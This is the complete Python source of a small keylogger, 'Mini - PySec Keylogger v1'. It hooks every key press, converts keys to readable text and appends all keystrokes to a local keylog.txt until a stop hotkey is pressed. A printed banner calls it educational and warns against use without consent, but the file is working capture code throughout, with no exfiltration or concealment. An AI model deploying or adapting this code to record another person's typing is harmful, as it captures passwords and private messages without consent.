import keyboard
import time
import os
import threading # Used for running the logger in a separate thread if needed, or for more complex background tasks
import pyfiglet

# --- Configuration ---
LOG_FILE = "keylog.txt" # Name of the file where keystrokes will be saved
STOP_HOTKEY = "ctrl+alt+x" # Hotkey to stop the keylogger
LOGGING_ACTIVE = True # Flag to control logging state

# --- ASCII Banner ---
def print_banner():
    ascii_banner = pyfiglet.figlet_format("Mini - PySec \nKeylogger v1")
    print(ascii_banner)
    print("By - @mello-io")
    print("=" * 30 + "\n")
    print("[!!] Developer's Note: This tool is for educational research purposes ONLY.")
    print("[!!] Do NOT use this tool on any system without EXPLICIT consent.")
    print("[!!] Unauthorized use of keyloggers is ILLEGAL and UNETHICAL.")
    print("[!!] Please use this file responsibly.")
    print("=" * 30 + "\n")

# --- Helper for Readable Output ---
def get_readable_key(event):
    # Converts a keyboard event into a more human-readable string.
    # Handles special keys and distinguishes between uppercase/lowercase.
    
    key_name = event.name

    # Handle special keys
    if len(key_name) > 1: # It's a special key like 'space', 'enter', 'shift'
        if key_name == "space":
            return " "
        elif key_name == "enter":
            return "[ENTER]\n"
        elif key_name == "tab":
            return "[TAB]"
        elif key_name == "backspace":
            return "[BACKSPACE]"
        elif key_name == "alt":
            return "[ALT]"
        elif key_name == "ctrl":
            return "[CTRL]"
        elif key_name == "shift":
            return "[SHIFT]"
        elif key_name == "caps lock":
            return "[CAPS_LOCK]"
        elif key_name == "esc":
            return "[ESC]"
        # Add more special keys as needed \⚠️
        return f"[{key_name.upper()}]" # Default for other special keys
    else:
        # For regular characters, check if shift is pressed for uppercase
        if keyboard.is_pressed('shift'):
            return key_name.upper()
        return key_name.lower() # Return lowercase for regular keys

# --- Key Logging Function ---
def on_key_event(event):
    # Callback function executed when a key is pressed.
    # Logs the key to a file with a timestamp.
    
    global LOGGING_ACTIVE # Declare global to modify the flag

    if not LOGGING_ACTIVE:
        return # Do not log if logging is not active

    # Check if the stop hotkey is pressed
    if event.event_type == keyboard.KEY_DOWN and keyboard.is_pressed(STOP_HOTKEY):
        print(f"\n[!] Stop hotkey '{STOP_HOTKEY}' detected. Stopping keylogger...")
        LOGGING_ACTIVE = False # Set flag to false to stop logging
        return

    if event.event_type == keyboard.KEY_DOWN: # Only log key down events
        #timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()) ; Need improvements
        readable_key = get_readable_key(event)

        #log_entry = f"[{timestamp}] {readable_key}"
        log_entry = readable_key

        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except IOError as e:
            print(f"[-] Error writing to log file: {e}")
        except Exception as e:
            print(f"[-] An unexpected error occurred during logging: {e}")

# --- Main Keylogger Function ---
def start_keylogger():

    print_banner()

    print(f"[+] Keylogger started. All keystrokes will be saved to: {LOG_FILE}")
    print(f"[+] Press '{STOP_HOTKEY}' to stop the keylogger.")
    print("[+] Please ensure you have necessary permissions (e.g., run as administrator/root).")

    # Hook the keyboard events
    # keyboard.on_press calls the callback for every key press
    keyboard.on_press(on_key_event)

    # Keep the script running in the background.
    # keyboard.wait() blocks the main thread until a specific hotkey is pressed,
    # since stopping is handled within on_key_event and uses a global flag,
    # temporary use a loop to keep the main thread alive is used. Need further feature development.
    # Alternatively, for a truly non-blocking main thread, the script can be deployed in a seperate thread.
    
    # Simple loop to keep the script alive while logging is active
    while LOGGING_ACTIVE:
        time.sleep(1) # Sleep to avoid busy-waiting and consuming CPU unnecessarily

    print("\n[+] Keylogger stopped. Exiting.")

# --- Entry Point ---
if __name__ == "__main__":
    start_keylogger()
